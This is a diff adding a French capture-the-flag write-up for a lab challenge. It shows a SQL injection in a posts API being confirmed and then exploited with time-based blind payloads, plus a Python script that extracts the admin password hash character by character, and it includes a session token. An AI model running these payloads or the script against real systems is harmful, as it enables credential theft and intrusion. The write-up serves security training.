@@ -156,41 +156,132 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g
 ```
 ## Chall 4
 
+Après authentification, l’application redirige l’utilisateur vers une page affichant une liste d’articles.  
+Lorsqu’un article est sélectionné, le navigateur envoie la requête suivante :
+
+```html
+GET /api/posts/<id-post>?<timestamp> HTTP/2
+```
+Ici, `<id-post>` représente l’identifiant numérique de l’article.
+La réponse associe bien l’ID à un contenu retourner sous format JSON :
+![[Pasted image 20251204234022.png]]
+Cela indique  que l’API récupère l’article correspondant depuis la base de données en fonction de l’ID fourni dans l’URL.
+Pour tester la robustesse du paramètre, on remplace l’ID numérique par une chaîne arbitraire :
+
+```
+GET /api/posts/test?1764887814058 HTTP/2
+```
+
 ![[Pasted image 20251204174836.png]]
+
+Dans Burp Suite, on observe une erreur renvoyée par le serveur.  Elle **provient directement du moteur MySQL**, et révèle plusieurs éléments importants :
+- l’application insère la valeur située après `/posts/` **directement dans une requête SQL**,
+- sans validation ni échappement correct,
+- en l’interprétant comme un champ ou une condition SQL.
+
+Pour vérifier que la valeur injectée est bien interprétée dans la requête SQL, j’envoie la payload suivante :
 
 ```sql
 1 OR SLEEP(5)
 ```
 
+J’observe alors que la réponse met systématiquement cinq secondes à revenir, ce qui confirme que le paramètre est effectivement injecté dans la requête SQL et que la vulnérabilité SQLi est exploitable.
+J’essaye ensuite d’envoyer une payload permettant de contourner totalement la condition du `WHERE` afin de récupérer l’intégralité des enregistrements :
+
 ```sql
 1 OR 1=1--
 ```
 
-![[Pasted image 20251204175630.png]]
+Cependant, malgré une injection syntaxiquement correcte, la réponse retournée par l’API reste strictement identique :
+
+```json
+{
+    "id": 1,
+    "username": "admin",
+    "title": "First",
+    "content": "I like to be the first one to post comment"
+}
+
+```
+
+Aucune donnée supplémentaire n’apparaît, ce qui indique que, même si la requête SQL est bien modifiée, l’application n’affiche qu’un seul enregistrement dans sa réponse.
+Cependant, puisque la requête ne renvoie pas d’erreur, cela signifie que l’injection est bien exécutée par le serveur, même si le résultat n’est pas affiché.  
+Je décide donc de tirer parti de ce comportement pour tenter d’extraire des informations sur la base de données.
+Comme première étape, j’essaie de vérifier si une table nommée `users` existe dans le schéma actuel.  
+Pour cela, j’envoie la payload suivante :
 
 ```sql
 1 UNION SELECT username,password FROM users--
 ```
 
-![[Pasted image 20251204175325.png]]
+J'obtiens cette erreur remonté par le server:
 
+![[Pasted image 20251204235633.png]]
 
+Cela confirme que la table `users` n’existe pas dans la base de données.  
+Je poursuis donc mes tests en ciblant une table potentiellement nommée `user`.  
+Cette fois, le serveur n’émet aucune erreur, ce qui laisse supposer que la table existe bien.
+
+À partir de là, je peux utiliser des injections conditionnelles basées sur la fonction `SLEEP(0.2)` afin d’inférer des informations sur la base de données.  
+Le principe est simple : si la condition que je teste est vraie, MySQL exécute `SLEEP(0.2)` et la réponse du serveur est retardée. Si elle est fausse, la requête s’exécute normalement et la réponse arrive immédiatement.  
+Cette différence de temps me permet donc de déterminer, sans jamais voir directement le résultat SQL, si une condition est vérifiée ou non.
+Grâce à ce mécanisme, je peux confirmer la présence de l’utilisateur `admin`, récupérer la longueur de son mot de passe, puis en extraire le hash caractère par caractère.
+
+- Cette requête me permet de vérifier que l’entrée “admin” est bien présente dans la table.
 ```sql
 1 OR IF((SELECT COUNT(*) FROM user WHERE username='admin')>0, SLEEP(0.2), 0)
 ```
 
+- Ici, je confirme que le mot de passe associé à l’utilisateur admin comporte 32 caractères.
 ```sql
 1 OR IF((SELECT LENGTH(password) FROM user WHERE username='admin')=32, SLEEP(0.2), 0)
 ```
 
+- Enfin, je créé une requête qui me permet de récupérer un caractère précis du mot de passe.
 ```sql
 1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),1,1)='a', SLEEP(0.2), 0)
 ```
 
+En répétant l’opération pour chaque position et pour chaque caractère possible, il devient alors possible d’exfiltrer l’intégralité du hash associé à l’utilisateur admin. Cette étape étant trop longue à faire à la main , je décide de créer un script python pour trouver le mot de passe:
+```python
+import requests
+import time
+
+url = "https://k5et0n88lteob5nq0fyte1ajpfd79g3m-2025-12-02-tdu3-b60612.wannatry.fr/api/posts/"
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3NjQ4NjQ4NDd9.YQarMCZiOnLh6ToX8uCGAARbxinhwE4H1SR3hdfaFMc"
+headers = {"Authorization": token}
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!"
+length = 32
+result = ""
+
+for i in range(1, length + 1):
+    for c in chars:
+        payload = f"1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),{i},1)='{c}',SLEEP(0.2),0)"
+        t0 = time.time()
+        requests.get(url + payload, headers=headers)
+        if time.time() - t0 > 0.2:
+            result += c
+            print(result)
+            break
+
+print("password:", result)
+```
+
+Après execution du script, j'obtiens ce résultat:
+![[Pasted image 20251205000419.png]]
+
+Le mot de passe récupéré est un hash MD5. Je le met dans crackstation et récupère le mot de passe admin associé:
+
 ![[Pasted image 20251204180730.png]]
+
+Enfin je me connect entant qu'admin au site, et j'accède au flag:
 
 ![[Pasted image 20251204180802.png]]
 
 ```
 FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof6utu-end.html}
 ```
+
+## Chall 5
+
